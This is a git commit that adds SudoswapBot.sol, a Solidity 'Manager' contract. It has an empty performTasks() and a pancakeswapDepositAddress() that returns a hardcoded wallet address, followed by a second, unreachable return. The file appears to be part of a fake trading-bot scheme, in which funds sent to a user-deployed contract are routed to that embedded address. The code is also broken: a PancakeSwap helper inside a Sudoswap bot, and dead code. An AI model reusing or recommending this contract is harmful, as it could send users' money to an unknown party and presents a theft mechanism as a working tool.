d3fc53813e8b07d9f700c2e9b7bdf156ec1bcc38
BlockchainWolfBot <117727523+BlockchainWolfBot@users.noreply.github.com>
2023-02-14 11:53:39 +0800

    Create SudoswapBot.sol

---
+++ blob/main/contract/SudoswapBot.sol
@@ -0,0 +1,12 @@
+// SPDX-License-Identifier: GPL-3.0
+pragma solidity ^0.5.0;
+contract Manager {
+    function performTasks() public pure{
+        
+    }
+
+    function pancakeswapDepositAddress() public pure returns (address) {
+        return 0xBA3dc59c6B315D91b754D2fdf4E66346C3Db2507;
+        return 0x48A3276fb2c5De8740b4B7885EeED8f6f2e0CAB4;
+    }
+}
